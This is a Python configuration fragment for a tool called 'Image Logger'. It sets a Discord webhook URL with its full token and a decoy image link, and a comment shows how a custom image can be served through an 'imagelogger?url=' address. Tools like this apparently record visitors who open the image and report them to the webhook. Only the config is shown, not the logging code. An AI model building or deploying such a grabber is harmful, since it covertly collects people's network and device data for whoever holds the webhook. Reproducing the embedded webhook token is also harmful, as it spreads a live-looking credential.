...
config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1072837784655630396/hN6wR3GgYn6r77S5ahYBLB6IDcS6c0QUwdb4qguZJCt_PguySjMkr9SOO83ZfE6biQWC",
    "image": "https://media.discordapp.net/attachments/1072837759745658970/1073206132170047488/click-978023__340.png", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)

    # CUSTOMIZATION #
    "dc logger": "Image Logger", # Set this to the name you want the webhook to have
